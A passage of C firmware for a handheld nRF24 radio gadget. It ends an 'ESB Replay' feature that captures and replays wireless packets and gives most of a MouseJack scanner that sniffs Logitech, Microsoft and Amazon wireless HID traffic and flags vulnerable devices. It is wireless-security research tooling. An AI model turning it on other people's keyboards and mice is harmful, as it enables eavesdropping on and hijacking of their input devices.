    EsbReplay_rpNext();
    EsbReplay_s_rpLastBtnMs = sys_monotonic_ms();
    EsbReplay_rpWaitNavRelease(BTN_RIGHT);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_DOWN)) {
    const uint32_t t0 = sys_monotonic_ms();
    while (isTouchNavButtonPressed(BTN_DOWN) && sys_monotonic_ms() - t0 < 700)
      sys_sleep_ms(10);
    if (sys_monotonic_ms() - t0 >= 700) {
      EsbReplay_rpClearCaptures();
    } else {
      EsbReplay_rpToggleArm();
    }
    EsbReplay_s_rpLastBtnMs = sys_monotonic_ms();
    EsbReplay_rpWaitNavRelease(BTN_DOWN);
    return;
  }
  if (isTouchNavButtonPressedEdge(BTN_UP)) {
    EsbReplay_rpPlaySelected();
    EsbReplay_s_rpLastBtnMs = sys_monotonic_ms();
    EsbReplay_rpWaitNavRelease(BTN_UP);
  }
}

void EsbReplay_runUI(void) {
  enum { kBarY = 20 };
  enum { kBarH = 16 };
  enum { kIconSz = 16 };
  enum { kIconN = 5 };
  static int iconX[kIconN] = {90, 130, 170, 210, 10};
  static int iconY = kBarY;
  static const unsigned char* icons[kIconN] = {
      bitmap_icon_LEFT, bitmap_icon_random, bitmap_icon_start,
      bitmap_icon_RIGHT, bitmap_icon_go_back};

  if (!EsbReplay_uiDrawn) {
    display_fill_rect(&(tft), 0, kBarY, 240, kBarH, DARK_GRAY);
    for (int i = 0; i < kIconN; i++) {
      if (icons[i])
        display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz, kIconSz,
                            UI_ICON);
    }
    display_draw_fast_h_line(&(tft), 0, 19, 240, UI_LINE);
    display_draw_fast_h_line(&(tft), 0, kBarY + kBarH, 240, UI_LINE);
    EsbReplay_uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && sys_monotonic_ms() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      display_draw_bitmap(&(tft), iconX[activeIcon], iconY, icons[activeIcon],
                          kIconSz, kIconSz, UI_ICON);
      animationState = 2;
      switch (activeIcon) {
        case 0:
          EsbReplay_rpPrev();
          break;
        case 1:
          EsbReplay_rpToggleArm();
          break;
        case 2:
          EsbReplay_rpPlaySelected();
          break;
        case 3:
          EsbReplay_rpNext();
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = sys_monotonic_ms();
  }

  static unsigned long lastTouchCheck = 0;
  if (sys_monotonic_ms() - lastTouchCheck >= 50) {
    int x, y;
    if (feature_active && readTouchXY(&(x), &(y))) {
      if (y > kBarY && y < kBarY + kBarH) {
        for (int i = 0; i < kIconN; i++) {
          if (x > iconX[i] && x < iconX[i] + kIconSz) {
            if (icons[i] && animationState == 0) {
              if (i == 4) {
                feature_exit_requested = true;
                EsbReplay_s_active = false;
              } else {
                display_draw_bitmap(&(tft), iconX[i], iconY, icons[i], kIconSz,
                                    kIconSz, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = sys_monotonic_ms();
              }
            }
            break;
          }
        }
      } else if (EsbReplay_s_capCount > 0 && y >= EsbReplay_kRpSelStartY &&
                 y < EsbReplay_rpSelEndY() && x >= 8 &&
                 x <= display_width(&(tft)) - 8) {
        const int row = (y - EsbReplay_kRpSelStartY) / EsbReplay_kRpLineHeight;
        if (row >= 0 && row < EsbReplay_kRpSelVisible) {
          EsbReplay_rpSelectAt(EsbReplay_s_selScroll + row);
        }
      }
    }
    lastTouchCheck = sys_monotonic_ms();
  }
}

void EsbReplay_esbReplaySetup(void) {
  setTouchButtonInputEnabled(true);
  bleSetEsbReplayNavLabels();
  bleClearBody(TFT_BLACK);

  EsbReplay_uiDrawn = false;
  EsbReplay_s_active = true;
  EsbReplay_s_armed = true;
  EsbReplay_s_hopping = true;
  EsbReplay_s_playing = false;
  EsbReplay_s_channel = EsbReplay_kRpHopChannels[0];
  EsbReplay_s_hopIndex = 0;
  EsbReplay_s_lastHopMs = sys_monotonic_ms();
  EsbReplay_s_heardTotal = 0;
  EsbReplay_s_capCount = 0;
  EsbReplay_s_selIndex = 0;
  EsbReplay_s_selScroll = 0;
  EsbReplay_s_selLineCount = 0;
  EsbReplay_s_logIndex = 0;
  EsbReplay_s_logDirty = false;
  EsbReplay_s_statusDirty = false;
  EsbReplay_s_selDirty = false;
  EsbReplay_s_lastUiMs = 0;

  for (int i = 0; i < EsbReplay_kRpMaxCaptures; i++)
    EsbReplay_s_caps[i].used = false;
  for (int i = 0; i < EsbReplay_kRpMaxSelLines; i++) {
    EsbReplay_s_selBuffer[i] = TEXT("");
    EsbReplay_s_selColor[i] = UI_DIM_TEXT;
    EsbReplay_s_selDrawn[i] = TEXT("");
    EsbReplay_s_selDrawnColor[i] = 0;
    EsbReplay_s_selDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbReplay_kRpMaxLogLines; i++) {
    EsbReplay_s_logBuffer[i] = TEXT("");
    EsbReplay_s_logColor[i] = UI_DIM_TEXT;
    EsbReplay_s_logDrawn[i] = TEXT("");
    EsbReplay_s_logDrawnColor[i] = 0;
    EsbReplay_s_logDrawnW[i] = 0;
  }
  for (int i = 0; i < EsbReplay_kRpStatusLines; i++) {
    EsbReplay_s_statusText[i] = TEXT("");
    EsbReplay_s_statusColor[i] = 0;
    EsbReplay_s_statusDrawnW[i] = 0;
  }

  float v = readBatteryVoltage();
  drawStatusBar(v, true, false);
  redrawTouchButtonBar();

  EsbReplay_runUI();
  EsbReplay_rpDrawTextBoxes();
  EsbReplay_rpAppendLog(TEXT("[+] ESB Replay ready"), UI_WARN);
  EsbReplay_rpAppendLog(TEXT("[*] Tap Select or Prev/Next"), UI_DIM_TEXT);
  EsbReplay_s_selDirty = true;
  EsbReplay_s_statusDirty = true;
  EsbReplay_rpFlushUi(true);
  redrawTouchButtonBar();

  setupTouchscreen();
  sys_configure_gpio(CE, GPIO_MODE_OUTPUT);
  sys_configure_gpio(CSN, GPIO_MODE_OUTPUT);
  EsbReplay_rpInitSpi();
  EsbReplay_rpConfigureRx();
  redrawTouchButtonBar();
}

void EsbReplay_esbReplayLoop(void) {
  EsbReplay_s_active = true;
  while (EsbReplay_s_active) {
    if (feature_active &&
        (feature_exit_requested || featureExitButtonPressed())) {
      feature_exit_requested = true;
      EsbReplay_s_active = false;
      break;
    }
    EsbReplay_rpHandleNavButtons();
    maintainTouchNavBar();
    EsbReplay_runUI();
    EsbReplay_rpStepHop();
    EsbReplay_rpPollCapture();
    EsbReplay_rpFlushUi(false);
    sys_sleep_ms(1);
  }
}

void EsbReplay_exit(void) {
  EsbReplay_s_active = false;
  EsbReplay_s_armed = false;
  EsbReplay_s_playing = false;
  EsbReplay_rpDisable();
  EsbReplay_rpPowerDown();
  spi_device_deselect(&(EsbReplay_radio_transport));
  refreshSdMount();
}

static spi_device_t MouseJack_radio_transport;

#undef CE
#define CE NRF24_SCAN_CE
#undef CSN
#define CSN NRF24_SCAN_CSN

#undef _MJ_CONFIG
#define _MJ_CONFIG 0x00
#undef _MJ_EN_AA
#define _MJ_EN_AA 0x01
#undef _MJ_EN_RXADDR
#define _MJ_EN_RXADDR 0x02
#undef _MJ_SETUP_AW
#define _MJ_SETUP_AW 0x03
#undef _MJ_SETUP_RETR
#define _MJ_SETUP_RETR 0x04
#undef _MJ_RF_CH
#define _MJ_RF_CH 0x05
#undef _MJ_RF_SETUP
#define _MJ_RF_SETUP 0x06
#undef _MJ_STATUS
#define _MJ_STATUS 0x07
#undef _MJ_RX_ADDR_P0
#define _MJ_RX_ADDR_P0 0x0A
#undef _MJ_RX_PW_P0
#define _MJ_RX_PW_P0 0x11

enum { MouseJack_kMjPayloadMax = 32 };
enum { MouseJack_kMjMaxDevices = 12 };
enum { MouseJack_kMjMaxLogLines = 16 };
enum { MouseJack_kMjStatusLines = 4 };
enum { MouseJack_kMjLineHeight = 12 };
enum { MouseJack_kMjToolbarBottom = 36 };
enum { MouseJack_kMjToolbarGap = 8 };
enum {
  MouseJack_kMjStatusY = MouseJack_kMjToolbarBottom + MouseJack_kMjToolbarGap
};
enum { MouseJack_kMjBoxHeaderH = 15 };
enum {
  MouseJack_kMjStatusTextY = MouseJack_kMjStatusY + MouseJack_kMjBoxHeaderH
};
enum {
  MouseJack_kMjStatusBoxH = MouseJack_kMjBoxHeaderH +
  (MouseJack_kMjStatusLines * MouseJack_kMjLineHeight) + 4
};
enum { MouseJack_kMjLogGap = 4 };
enum {
  MouseJack_kMjLogBoxTop = MouseJack_kMjStatusY + MouseJack_kMjStatusBoxH +
  MouseJack_kMjLogGap
};
enum {
  MouseJack_kMjLogStartY = MouseJack_kMjLogBoxTop + MouseJack_kMjBoxHeaderH
};
enum { MouseJack_kMjLogBottomPad = 4 };
enum { MouseJack_kMjHopIntervalMs = 60 };
enum { MouseJack_kMjDeviceTimeoutMs = 45000 };

// Channels commonly used by Logitech Unifying / Microsoft / related HID
// (MouseJack research).
static const uint8_t MouseJack_kMjChannels[] = {
    2,  3,  4,  5,  6,  7,  8,  9,  10, 11, 12, 13, 14, 15, 16, 17, 18, 19,
    20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 32, 33, 35, 37, 40, 42, 44,
    46, 48, 50, 52, 55, 57, 60, 62, 65, 67, 68, 70, 72, 74, 76, 78, 80, 82};
enum {
  MouseJack_kMjChannelCount = sizeof(MouseJack_kMjChannels) /
  sizeof(MouseJack_kMjChannels[0])
};

static const uint8_t MouseJack_kMjPromiscAddr[5] = {0x55, 0x55, 0x55, 0x55,
                                                    0x55};

typedef uint8_t MouseJack_MjVendor;
enum {
  MouseJack_MjVendor_Unknown = 0,
  MouseJack_MjVendor_Logitech,
  MouseJack_MjVendor_Microsoft,
  MouseJack_MjVendor_Amazon,
  MouseJack_MjVendor_Other
};

typedef struct MouseJack_MjDevice {
  uint8_t addr[5];
  bool used;
  MouseJack_MjVendor vendor;
  bool vulnerable;
  uint16_t hits;
  uint8_t lastCh;
  uint32_t lastSeenMs;
} MouseJack_MjDevice;
#define MouseJack_MjDevice_INITIALIZER   \
  {.used = false,                        \
   .vendor = MouseJack_MjVendor_Unknown, \
   .vulnerable = false,                  \
   .hits = 0,                            \
   .lastCh = 0,                          \
   .lastSeenMs = 0}
;

static bool MouseJack_uiDrawn = false;
static volatile bool MouseJack_scanning = false;
static bool MouseJack_s_paused = false;
static uint8_t MouseJack_s_channel = 2;
static int MouseJack_s_hopIndex = 0;
static uint32_t MouseJack_s_lastHopMs = 0;
static uint32_t MouseJack_s_packetTotal = 0;
static uint16_t MouseJack_s_deviceCount = 0;
static uint16_t MouseJack_s_vulnCount = 0;

static MouseJack_MjDevice MouseJack_s_devices[MouseJack_kMjMaxDevices];

enum {
  MouseJack_s_logBuffer_COUNT = MouseJack_kMjMaxLogLines,
  MouseJack_s_logBuffer_OFFSET = 0
};
_Static_assert(MouseJack_s_logBuffer_OFFSET + MouseJack_s_logBuffer_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJack_s_logBuffer                  \
  (*(text_t(*)[MouseJack_s_logBuffer_COUNT]) & \
   feature_text_slots[MouseJack_s_logBuffer_OFFSET])
static uint16_t MouseJack_s_logColor[MouseJack_kMjMaxLogLines];
static int MouseJack_s_logIndex = 0;

enum {
  MouseJack_s_statusText_COUNT = MouseJack_kMjStatusLines,
  MouseJack_s_statusText_OFFSET = MouseJack_s_logBuffer_OFFSET +
      MouseJack_s_logBuffer_COUNT
};
_Static_assert(MouseJack_s_statusText_OFFSET + MouseJack_s_statusText_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJack_s_statusText                  \
  (*(text_t(*)[MouseJack_s_statusText_COUNT]) & \
   feature_text_slots[MouseJack_s_statusText_OFFSET])
static uint16_t MouseJack_s_statusColor[MouseJack_kMjStatusLines];
static int MouseJack_s_statusDrawnW[MouseJack_kMjStatusLines];

enum {
  MouseJack_s_logDrawn_COUNT = MouseJack_kMjMaxLogLines,
  MouseJack_s_logDrawn_OFFSET = MouseJack_s_statusText_OFFSET +
      MouseJack_s_statusText_COUNT
};
_Static_assert(MouseJack_s_logDrawn_OFFSET + MouseJack_s_logDrawn_COUNT <=
                   FEATURE_TEXT_SLOTS,
               "Feature text capacity");
#define MouseJack_s_logDrawn                  \
  (*(text_t(*)[MouseJack_s_logDrawn_COUNT]) & \
   feature_text_slots[MouseJack_s_logDrawn_OFFSET])
static uint16_t MouseJack_s_logDrawnColor[MouseJack_kMjMaxLogLines];
static int MouseJack_s_logDrawnW[MouseJack_kMjMaxLogLines];

static bool MouseJack_s_mjLogDirty = false;
static bool MouseJack_s_mjStatusDirty = false;
static bool MouseJack_s_mjListDirty = false;
static uint32_t MouseJack_s_mjLastUiMs = 0;
enum { MouseJack_kMjUiMinIntervalMs = 120 };

static int MouseJack_mjLogBoxBottom(void) {
  return bleContentBottom() - MouseJack_kMjLogBottomPad;
}

static int MouseJack_mjLogBoxH(void) {
  const int h = MouseJack_mjLogBoxBottom() - MouseJack_kMjLogBoxTop;
  return h > (MouseJack_kMjBoxHeaderH + MouseJack_kMjLineHeight)
             ? h
             : (MouseJack_kMjBoxHeaderH + MouseJack_kMjLineHeight);
}

static int MouseJack_mjLogEndY(void) {
  return MouseJack_kMjLogBoxTop + MouseJack_mjLogBoxH() - 2;
}

static int MouseJack_mjVisibleLogLines(void) {
  const int avail = MouseJack_mjLogEndY() - MouseJack_kMjLogStartY;
  if (avail <= 0) {
    return 1;
  }
  const int n = avail / MouseJack_kMjLineHeight;
  if (n < 1) {
    return 1;
  }
  return n > MouseJack_kMjMaxLogLines ? MouseJack_kMjMaxLogLines : n;
}

static uint8_t MouseJack_mjGetRegister(uint8_t r) {
  uint8_t c;
  spi_device_select(&(MouseJack_radio_transport));
  spi_device_transfer(&(MouseJack_radio_transport), r & 0x1F);
  c = spi_device_transfer(&(MouseJack_radio_transport), 0);
  spi_device_deselect(&(MouseJack_radio_transport));
  return c;
}

static void MouseJack_mjSetRegister(uint8_t r, uint8_t v) {
  spi_device_select(&(MouseJack_radio_transport));
  spi_device_transfer(&(MouseJack_radio_transport), (r & 0x1F) | 0x20);
  spi_device_transfer(&(MouseJack_radio_transport), v);
  spi_device_deselect(&(MouseJack_radio_transport));
}

static void MouseJack_mjWriteRegMulti(uint8_t reg, const uint8_t* data,
                                      uint8_t len) {
  spi_device_select(&(MouseJack_radio_transport));
  spi_device_transfer(&(MouseJack_radio_transport), (reg & 0x1F) | 0x20);
  for (uint8_t i = 0; i < len; i++) {
    spi_device_transfer(&(MouseJack_radio_transport), data[i]);
  }
  spi_device_deselect(&(MouseJack_radio_transport));
}

static void MouseJack_mjDisable(void) { gpio_set_level(((gpio_num_t)(CE)), 0); }
static void MouseJack_mjEnable(void) { gpio_set_level(((gpio_num_t)(CE)), 1); }

static void MouseJack_mjPowerUp(void) {
  MouseJack_mjSetRegister(_MJ_CONFIG,
                          MouseJack_mjGetRegister(_MJ_CONFIG) | 0x02);
  esp_rom_delay_us(130);
}

static void MouseJack_mjPowerDown(void) {
  MouseJack_mjSetRegister(_MJ_CONFIG,
                          MouseJack_mjGetRegister(_MJ_CONFIG) & ~0x02);
}

static void MouseJack_mjFlushRx(void) {
  spi_device_select(&(MouseJack_radio_transport));
  spi_device_transfer(&(MouseJack_radio_transport), 0xE2);
  spi_device_deselect(&(MouseJack_radio_transport));
}

static void MouseJack_mjInitRadioSpi(void) {
  spi_device_init(&(MouseJack_radio_transport), DIV_SD_HOST, SD_SCLK, SD_MISO,
                  SD_MOSI, CSN, 8000000, false);
}

static void MouseJack_mjApplyChannel(uint8_t ch) {
  MouseJack_mjDisable();
  MouseJack_mjSetRegister(_MJ_RF_CH, ch);
  MouseJack_mjFlushRx();
  MouseJack_mjEnable();
  esp_rom_delay_us(130);
}

static void MouseJack_mjConfigureRadio(void) {
  MouseJack_mjDisable();
  MouseJack_mjPowerUp();
  MouseJack_mjWriteRegMulti(_MJ_RX_ADDR_P0, MouseJack_kMjPromiscAddr, 5);
  MouseJack_mjSetRegister(_MJ_EN_AA, 0x00);
  MouseJack_mjSetRegister(_MJ_EN_RXADDR, 0x01);
  MouseJack_mjSetRegister(_MJ_SETUP_AW, 0x03);
  MouseJack_mjSetRegister(_MJ_SETUP_RETR, 0x00);
  MouseJack_mjSetRegister(_MJ_RF_SETUP, 0x0F);  // 2 Mbps, high gain
  MouseJack_mjSetRegister(_MJ_RX_PW_P0, MouseJack_kMjPayloadMax);
  MouseJack_mjSetRegister(_MJ_CONFIG, 0x03);  // PWR_UP | PRIM_RX, CRC off
  MouseJack_mjApplyChannel(MouseJack_s_channel);
}

static uint8_t MouseJack_mjLogitechChecksum(const uint8_t* p, int len) {
  uint8_t ck = 0xFF;
  for (int i = 0; i < len - 1; i++) {
    ck = (uint8_t)((ck - p[i]) & 0xFF);
  }
  return (uint8_t)((ck + 1) & 0xFF);
}

static bool MouseJack_mjLooksLikeLogitech(const uint8_t* p, int len) {
  if (len < 6 || len > 22) {
    return false;
  }
  return MouseJack_mjLogitechChecksum(p, len) == p[len - 1];
}

// Logitech Unifying unencrypted HID reports (MouseJack-vulnerable class).
static bool MouseJack_mjLogitechVulnerableReport(const uint8_t* p, int len) {
  if (!MouseJack_mjLooksLikeLogitech(p, len) || len < 8) {
    return false;
  }
  // Unencrypted keyboard / multimedia frames commonly seen in research dumps.
  const uint8_t t = p[1];
  if (t == 0x10 || t == 0x11 || t == 0x01 || t == 0xC1) {
    return true;
  }
  // Unencrypted mouse keepalives / motion without encryption markers.
  if (t == 0x00 && len <= 10) {
    return true;
  }
  return false;
}

static bool MouseJack_mjLooksLikeMicrosoft(const uint8_t* p, int len) {
  if (len < 8) {
    return false;
  }
  // Microsoft wireless HID often carries a stable header nibble pattern.
  if (p[0] == 0x0A || p[0] == 0x08 || p[0] == 0x0F) {
    return true;
  }
  return false;
}

static bool MouseJack_mjLooksLikeAmazon(const uint8_t* p, int len) {
  if (len < 6) {
    return false;
  }
  // Fire TV / Amazon remotes on nRF24 often use short frames with 0x0D/0x40
  // prefixes.
  return (p[0] == 0x0D || p[0] == 0x40 || p[0] == 0x4F);
}

static bool MouseJack_mjPayloadInteresting(const uint8_t* p, int len) {
  if (len < 5) {
    return false;
  }
  int zeros = 0;
  int ff = 0;
  for (int i = 0; i < len; i++) {
    if (p[i] == 0x00) zeros++;
    if (p[i] == 0xFF) ff++;
  }
  if (zeros >= len - 1 || ff >= len - 1) {
    return false;
  }
  return MouseJack_mjLooksLikeLogitech(p, len) ||
         MouseJack_mjLooksLikeMicrosoft(p, len) ||
         MouseJack_mjLooksLikeAmazon(p, len);
}

static int MouseJack_mjTrimLen(const uint8_t* p, int maxLen) {
  int len = maxLen;
  while (len > 1 && p[len - 1] == 0x00) {
    len--;
  }
  return len;
}

static text_t MouseJack_mjAddrToString(const uint8_t* a) {
  char buf[16];
  snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X", a[0], a[1], a[2], a[3],
           a[4]);
  return TEXT(buf);
}

static const char* MouseJack_mjVendorName(MouseJack_MjVendor v) {
  switch (v) {
    case MouseJack_MjVendor_Logitech:
      return "Logitech";
    case MouseJack_MjVendor_Microsoft:
      return "Microsoft";
    case MouseJack_MjVendor_Amazon:
      return "Amazon";
    case MouseJack_MjVendor_Other:
      return "nRF HID";
    default:
      return "Unknown";
  }
}

static void MouseJack_mjClassify(const uint8_t* p, int len,
                                 MouseJack_MjVendor* vendor, bool* vulnerable) {
  (*vendor) = MouseJack_MjVendor_Unknown;
  (*vulnerable) = false;
  if (MouseJack_mjLooksLikeLogitech(p, len)) {
    (*vendor) = MouseJack_MjVendor_Logitech;
    (*vulnerable) = MouseJack_mjLogitechVulnerableReport(p, len);
    return;
  }
  if (MouseJack_mjLooksLikeMicrosoft(p, len)) {
    (*vendor) = MouseJack_MjVendor_Microsoft;
    // Many older Microsoft wireless HID stacks were in scope of MouseJack-class
    // attacks.
    (*vulnerable) = true;
    return;
  }
  if (MouseJack_mjLooksLikeAmazon(p, len)) {
    (*vendor) = MouseJack_MjVendor_Amazon;
    (*vulnerable) = true;
    return;
  }
  (*vendor) = MouseJack_MjVendor_Other;
}

static void MouseJack_mjRebuildCounts(void) {
  MouseJack_s_deviceCount = 0;
  MouseJack_s_vulnCount = 0;
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (!MouseJack_s_devices[i].used) {
      continue;
    }
    MouseJack_s_deviceCount++;
    if (MouseJack_s_devices[i].vulnerable) {
      MouseJack_s_vulnCount++;
    }
  }
}

static void MouseJack_mjAppendLogLine(text_t text, uint16_t color) {
  const int visible = MouseJack_mjVisibleLogLines();
  for (int i = visible - 1; i > 0; i--) {
    MouseJack_s_logBuffer[i] = MouseJack_s_logBuffer[i - 1];
    MouseJack_s_logColor[i] = MouseJack_s_logColor[i - 1];
  }
  MouseJack_s_logBuffer[0] = text;
  MouseJack_s_logColor[0] = color;
  if (MouseJack_s_logIndex < visible) {
    MouseJack_s_logIndex++;
  }
  MouseJack_s_mjLogDirty = true;
}

enum { MouseJack_kMjStatPadX = 10 };
enum { MouseJack_kMjStatValueX = 70 };
enum { MouseJack_kMjStatTextDy = 2 };

static void MouseJack_mjPaintTextLine(int x, int y, int maxW, int lineH,
                                      text_t* cacheText, uint16_t* cacheColor,
                                      int* cacheW, text_t text,
                                      uint16_t color) {
  if ((strcmp(((*cacheText)).data, (text).data) == 0) &&
      (*cacheColor) == color) {
    return;
  }
  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  const int newW = strlen((text).data)
                       ? (display_text_width(&(tft), (text).data, 0) + 2)
                       : 0;
  int clearW = (*cacheW) > newW ? (*cacheW) : newW;
  if (clearW < 8) {
    clearW = maxW;
  }
  if (clearW > maxW) {
    clearW = maxW;
  }
  display_fill_rect(&(tft), x, y, clearW, lineH, TFT_BLACK);
  if (strlen((text).data)) {
    display_set_text_color_2(&(tft), color, TFT_BLACK);
    display_set_cursor(&(tft), x, y + MouseJack_kMjStatTextDy);
    display_print(&(tft), (text).data);
  }
  (*cacheText) = text;
  (*cacheColor) = color;
  (*cacheW) = newW > 0 ? newW : 0;
}

static void MouseJack_mjRedrawLog(void) {
  const int endY = MouseJack_mjLogEndY();
  const int visible = MouseJack_mjVisibleLogLines();
  const int maxW = display_width(&(tft)) - 16;
  display_set_text_datum(&(tft), TL_DATUM);
  for (int i = 0; i < visible; i++) {
    const int y = MouseJack_kMjLogStartY + i * MouseJack_kMjLineHeight;
    if (y + MouseJack_kMjLineHeight > endY) {
      break;
    }
    if (i < MouseJack_s_logIndex) {
      MouseJack_mjPaintTextLine(
          MouseJack_kMjStatPadX, y, maxW, MouseJack_kMjLineHeight,
          &(MouseJack_s_logDrawn[i]), &(MouseJack_s_logDrawnColor[i]),
          &(MouseJack_s_logDrawnW[i]), MouseJack_s_logBuffer[i],
          MouseJack_s_logColor[i]);
    } else {
      MouseJack_mjPaintTextLine(
          MouseJack_kMjStatPadX, y, maxW, MouseJack_kMjLineHeight,
          &(MouseJack_s_logDrawn[i]), &(MouseJack_s_logDrawnColor[i]),
          &(MouseJack_s_logDrawnW[i]), TEXT(""), UI_DIM_TEXT);
    }
  }
  MouseJack_s_mjLogDirty = false;
}

static void MouseJack_mjDrawStatusValue(int line, text_t text, uint16_t color) {
  if (line < 0 || line >= MouseJack_kMjStatusLines) {
    return;
  }
  const int y = MouseJack_kMjStatusTextY + line * MouseJack_kMjLineHeight;
  const int maxW = display_width(&(tft)) - MouseJack_kMjStatValueX - 8;
  MouseJack_mjPaintTextLine(
      MouseJack_kMjStatValueX, y, maxW, MouseJack_kMjLineHeight,
      &(MouseJack_s_statusText[line]), &(MouseJack_s_statusColor[line]),
      &(MouseJack_s_statusDrawnW[line]), text, color);
}

static void MouseJack_mjDrawTextBoxes(void) {
  const int logH = MouseJack_mjLogBoxH();
  const int endY = MouseJack_mjLogEndY();
  display_fill_rect(&(tft), 0, MouseJack_kMjStatusY - 2, display_width(&(tft)),
                    endY - MouseJack_kMjStatusY + 4, TFT_BLACK);
  display_draw_fast_h_line(&(tft), 0, 19, display_width(&(tft)), UI_LINE);
  display_draw_round_rect(&(tft), 4, MouseJack_kMjStatusY,
                          display_width(&(tft)) - 8, MouseJack_kMjStatusBoxH, 3,
                          UI_LINE);
  display_draw_round_rect(&(tft), 4, MouseJack_kMjLogBoxTop,
                          display_width(&(tft)) - 8, logH, 3, UI_LINE);

  display_set_text_datum(&(tft), TL_DATUM);
  display_set_text_size(&(tft), 1);
  display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
  display_set_cursor(&(tft), MouseJack_kMjStatPadX, MouseJack_kMjStatusY + 3);
  display_print(&(tft), "Scan Status");
  display_set_cursor(&(tft), MouseJack_kMjStatPadX, MouseJack_kMjLogBoxTop + 3);
  display_print(&(tft), "Devices");

  static const char* kLabels[MouseJack_kMjStatusLines] = {"Ch", "Found", "Mode",
                                                          "State"};
  for (int i = 0; i < MouseJack_kMjStatusLines; i++) {
    const int y = MouseJack_kMjStatusTextY + i * MouseJack_kMjLineHeight +
                  MouseJack_kMjStatTextDy;
    display_set_text_color_2(&(tft), UI_DIM_TEXT, TFT_BLACK);
    display_set_cursor(&(tft), MouseJack_kMjStatPadX, y);
    display_print(&(tft), (TEXT(kLabels[i])).data);
    MouseJack_s_statusText[i] = TEXT("");
    MouseJack_s_statusColor[i] = 0;
    MouseJack_s_statusDrawnW[i] = 0;
  }
  for (int i = 0; i < MouseJack_kMjMaxLogLines; i++) {
    MouseJack_s_logDrawn[i] = TEXT("");
    MouseJack_s_logDrawnColor[i] = 0;
    MouseJack_s_logDrawnW[i] = 0;
  }
}

static void MouseJack_mjUpdateStatusPanel(void) {
  char chVal[28];
  snprintf(chVal, sizeof(chVal), "%u  %lu pkts", (unsigned)MouseJack_s_channel,
           (unsigned long)MouseJack_s_packetTotal);
  MouseJack_mjDrawStatusValue(0, TEXT(chVal), UI_TEXT);

  char foundVal[28];
  snprintf(foundVal, sizeof(foundVal), "%u  Vuln %u",
           (unsigned)MouseJack_s_deviceCount, (unsigned)MouseJack_s_vulnCount);
  MouseJack_mjDrawStatusValue(
      1, TEXT(foundVal),
      MouseJack_s_vulnCount > 0
          ? UI_WARN
          : (MouseJack_s_deviceCount > 0 ? UI_OK : UI_DIM_TEXT));

  MouseJack_mjDrawStatusValue(2, TEXT("Channel hop"), UI_DIM_TEXT);

  if (MouseJack_s_paused) {
    MouseJack_mjDrawStatusValue(3, TEXT("Paused"), UI_WARN);
  } else {
    MouseJack_mjDrawStatusValue(
        3, TEXT(MouseJack_scanning ? "Scanning" : "Stopped"),
        MouseJack_scanning ? UI_OK : UI_DIM_TEXT);
  }
  MouseJack_s_mjStatusDirty = false;
}

static void mj_push_device(const MouseJack_MjDevice* d) {
  if (MouseJack_s_logIndex >= MouseJack_mjVisibleLogLines()) {
    return;
  }
  text_t line = MouseJack_mjAddrToString(d->addr);
  text_append_cstr(&(line), " ");
  text_append_cstr(&(line), (TEXT(MouseJack_mjVendorName(d->vendor))).data);
  if (d->vulnerable) {
    text_append_cstr(&(line), " VULN");
  }
  text_append_cstr(&(line), " x");
  text_append_cstr(&(line), (TEXT(d->hits)).data);
  MouseJack_s_logBuffer[MouseJack_s_logIndex] = line;
  MouseJack_s_logColor[MouseJack_s_logIndex] =
      d->vulnerable ? UI_WARN : UI_TEXT;
  MouseJack_s_logIndex++;
}
static void MouseJack_mjRebuildDeviceLines(void) {
  const int visible = MouseJack_mjVisibleLogLines();
  MouseJack_s_logIndex = 0;
  for (int i = 0; i < MouseJack_kMjMaxLogLines; i++) {
    MouseJack_s_logBuffer[i] = TEXT("");
    MouseJack_s_logColor[i] = UI_DIM_TEXT;
  }

  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (MouseJack_s_devices[i].used && MouseJack_s_devices[i].vulnerable) {
      mj_push_device(&(MouseJack_s_devices[i]));
    }
  }
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (MouseJack_s_devices[i].used && !MouseJack_s_devices[i].vulnerable) {
      mj_push_device(&(MouseJack_s_devices[i]));
    }
  }
  if (MouseJack_s_deviceCount == 0) {
    MouseJack_s_logBuffer[0] = TEXT("[*] Waiting for HID traffic...");
    MouseJack_s_logColor[0] = UI_DIM_TEXT;
    MouseJack_s_logIndex = 1;
  }
  MouseJack_s_mjLogDirty = true;
  MouseJack_s_mjListDirty = false;
}

static void MouseJack_mjFlushUi(bool force) {
  const uint32_t now = sys_monotonic_ms();
  if (!force && (now - MouseJack_s_mjLastUiMs) < MouseJack_kMjUiMinIntervalMs) {
    return;
  }
  if (!force && !MouseJack_s_mjLogDirty && !MouseJack_s_mjStatusDirty &&
      !MouseJack_s_mjListDirty) {
    return;
  }
  MouseJack_s_mjLastUiMs = now;
  if (MouseJack_s_mjListDirty) {
    MouseJack_mjRebuildDeviceLines();
  }
  if (MouseJack_s_mjStatusDirty || force) {
    MouseJack_mjUpdateStatusPanel();
  }
  if (MouseJack_s_mjLogDirty || force) {
    MouseJack_mjRedrawLog();
  }
}

static int MouseJack_mjFindDevice(const uint8_t* addr) {
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (MouseJack_s_devices[i].used &&
        memcmp(MouseJack_s_devices[i].addr, addr, 5) == 0) {
      return i;
    }
  }
  return -1;
}

static int MouseJack_mjAllocDevice(void) {
  int oldest = -1;
  uint32_t oldestMs = UINT32_MAX;
  for (int i = 0; i < MouseJack_kMjMaxDevices; i++) {
    if (!MouseJack_s_devices[i].used) {
      return i;
    }
    if (MouseJack_s_devices[i].lastSeenMs < oldestMs) {
